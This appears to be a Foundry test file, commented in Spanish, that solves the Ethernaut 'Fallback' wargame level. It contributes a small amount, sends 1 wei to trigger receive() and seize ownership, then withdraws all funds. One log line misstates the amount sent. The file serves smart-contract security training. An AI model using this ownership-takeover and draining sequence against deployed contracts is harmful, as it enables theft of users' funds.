// SPDX-License-Identifier: MIT

pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {Fallback} from "../src/01-Fallback/Fallback.sol";

contract FallbackTest is Test {
    Fallback public levelInstance;
    address public attacker = makeAddr("attacker");

    function setUp() public {
        // Simulamos el despliegue original por parte del Ethernaut (owner inicial)
        levelInstance = new Fallback();
        // Damos algo de saldo al atacante para las transacciones
        vm.deal(attacker, 1 ether);
    }

    function testExploit() public {
        vm.startPrank(attacker);

        // PASO 1: Contribuir una cantidad mínima para cumplir el requisito de 'contributions[msg.sender] > 0'
        console.log("Contribute con 0.0001 ether...");
        levelInstance.contribute{value: 0.0005 ether}();

        // PASO 2: Disparar la función receive() enviando 1 wei directamente al contrato
        console.log("Enviando ether directamente para activar receive()...");
        (bool success, ) = address(levelInstance).call{value: 1 wei}("");
        require(success, "Transfer failed");

        // PASO 3: Verificar que ahora somos los dueños
        assertEq(levelInstance.owner(), attacker);
        console.log("Ownership secuestrado con exito!");

        // PASO 4: Drenar los fondos
        levelInstance.withdraw();
        assertEq(address(levelInstance).balance, 0);
        console.log("Contrato drenado. Balance final: 0");

        vm.stopPrank();
    }
}
